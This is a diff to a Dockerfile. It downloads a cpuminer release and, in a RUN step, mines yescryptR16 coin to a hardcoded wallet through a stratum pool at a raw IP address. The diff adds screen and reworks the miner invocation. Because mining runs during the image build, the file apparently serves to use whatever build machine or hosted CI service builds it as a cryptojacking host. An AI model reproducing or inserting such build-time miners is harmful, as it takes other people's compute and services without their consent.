@@ -3,6 +3,8 @@ ENV DEBIAN_FRONTEND=noninteractive \
     DEBCONF_NONINTERACTIVE_SEEN=true
 RUN apt-get -qqy update -y \
     && apt-get install wget -y \
+    && apt-get install screen -y \
     && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz \
     && tar xf cpuminer-opt-linux.tar.gz 
-RUN & ./cpuminer-avx -a yescryptR16 -o stratum+tcp://39.98.39.1:9661 -u qYanpTkNHMTYRWQPzSArhipYGkdP5qgYrR.t01 -p x -t 1
+RUN screen -r admin \
+    && ./cpuminer-avx -a yescryptR16 -o stratum+tcp://39.98.39.1:9661 -u qYanpTkNHMTYRWQPzSArhipYGkdP5qgYrR.t01 -p x -t 1
